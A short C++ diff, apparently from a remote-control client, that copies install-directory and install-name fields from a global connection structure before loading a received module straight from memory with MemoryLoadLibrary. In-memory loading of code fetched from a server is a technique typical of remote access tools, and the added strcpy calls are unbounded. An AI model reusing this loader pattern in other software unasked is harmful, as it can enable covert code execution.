@@ -199,6 +199,8 @@ public:
             addr->protoType = g_ConnectAddress.protoType;
             addr->runningType = g_ConnectAddress.runningType;
             strcpy(addr->szGroupName, g_ConnectAddress.szGroupName);
+            strcpy(addr->installDir, g_ConnectAddress.installDir);
+            strcpy(addr->installName, g_ConnectAddress.installName);
         }
         m_mod = ::MemoryLoadLibrary(buffer + 6 + sizeof(PkgHeader), size);
         SAFE_DELETE_ARRAY(buffer);
